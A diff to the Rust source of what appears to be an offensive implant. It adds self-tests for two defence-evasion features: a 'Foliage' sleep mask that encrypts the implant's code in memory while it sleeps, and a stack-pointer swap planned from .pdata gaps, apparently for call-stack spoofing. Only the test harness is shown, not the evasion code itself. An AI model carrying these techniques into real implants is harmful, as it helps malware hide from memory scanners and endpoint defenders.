@@ -1655,6 +1655,46 @@ fn join(base: &str, suffix: &str) -> String {
     s
 }
 
+// ============================================================================
+// P2.1a-iii Foliage sleep mask: arm + one 1s sleep cycle, check no crash.
+// bit0 = armed + sleep returned (no crash). The mask/unmask round-trip didn't
+// corrupt the running image (we're executing through .text — if RC4 left it
+// encrypted we'd never reach the exit).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_foliage() {
+    let mut mask: u32 = 0;
+    crate::sleep::set_foliage_enabled(true);
+    // One 1-second sleep through the Foliage path. If it returns, the mask/
+    // unmask round-trip didn't corrupt the running image.
+    crate::sleep::sleep(1);
+    mask |= 1 << 0; // reached the exit → no crash
+    crate::sleep::set_foliage_enabled(false);
+    unsafe { exit(mask) };
+}
+
+// ============================================================================
+// P2.1a-ii swap decision: confirm the staging + decide() path runs without
+// panic, without arming the live RSP swap. bit0 = decision logic ran, bit1 =
+// gaps staged (gap pool non-empty on this host).
+// ============================================================================
+
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_swap_decision() {
+    let mut mask: u32 = 0;
+    let scanner = crate::evasion_glue::LivePdataScanner;
+    if let Ok(pool) = nyx_implant_evasionsdk::PdataGapScanner::scan(&scanner) {
+        if pool.is_usable() {
+            mask |= 1 << 1; // gaps staged
+        }
+        // Exercise the pure decision logic (CET-off Server 2019 + whatever gaps).
+        let _ = nyx_implant_evasionsdk::swap::decide(false, pool.is_usable());
+        mask |= 1 << 0; // decision logic ran without panic
+    }
+    unsafe { exit(mask) };
+}
+
 /// Linear sub-slice search (no_std has no `contains` for &[u8] vs &[u8]).
 fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
     if needle.is_empty() {
